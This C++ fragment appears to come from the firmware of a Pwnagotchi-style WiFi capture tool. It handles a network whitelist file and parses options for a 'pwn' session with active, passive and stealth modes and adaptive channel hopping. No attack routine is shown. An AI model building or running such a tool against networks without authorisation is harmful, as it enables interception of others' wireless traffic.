                else if (target >= nb && target - nb < (int)s_wlSsid.size()) s_wlSsid.erase(s_wlSsid.begin() + (target - nb));
                wlList(dm); return;
            }
            // rewrite file without row #target
            File f = SD.open(PWN_F_WHITELIST, FILE_READ);
            std::vector<String> keep; int n = 0;
            if (f) { while (f.available()) { String ln = f.readStringUntil('\n'); ln.trim();
                if (!ln.length() || ln[0] == '#') continue; if (n != target) keep.push_back(ln); n++; } f.close(); }
            File w = SD.open(PWN_F_WHITELIST, FILE_WRITE);
            if (w) { for (auto& s : keep) { w.println(s); } w.close(); }
            wlList(dm); return;
        }
        wlList(dm); return;
    }

    // mode / channel flags
    PwnMode mode = PWN_ACTIVE;
    if (argHas(args, "passive")) mode = PWN_PASSIVE;
    else if (argHas(args, "stealth")) mode = PWN_STEALTH;
    // Adaptive roaming over ALL 13 channels is the DEFAULT ("a pet that learns" — and full-13
    // is where the learner actually earns its keep). `pwn basic` = the plain fixed 1/6/11
    // round-robin. Toggle the learner live with [a].
    s_aiDebug = argHas(args, "debug");        // `pwn debug` → per-hop decision trace to ai_debug.log
    s_aiOn    = !argHas(args, "basic");       // AI on by default; `basic` turns it off
    // Channel set: AI sweeps all 13, basic sticks to 1/6/11. `full` forces 13, `fast` forces
    // 1/6/11 — either overrides the default so any combo is reachable (`pwn fast` = smart-but-3ch,
    // `pwn basic full` = plain-but-13ch).
    bool full = argHas(args, "fast") ? false
              : argHas(args, "full") ? true
              : s_aiOn;

    runPwnSession(mode, full, /*backlog*/ true);
}
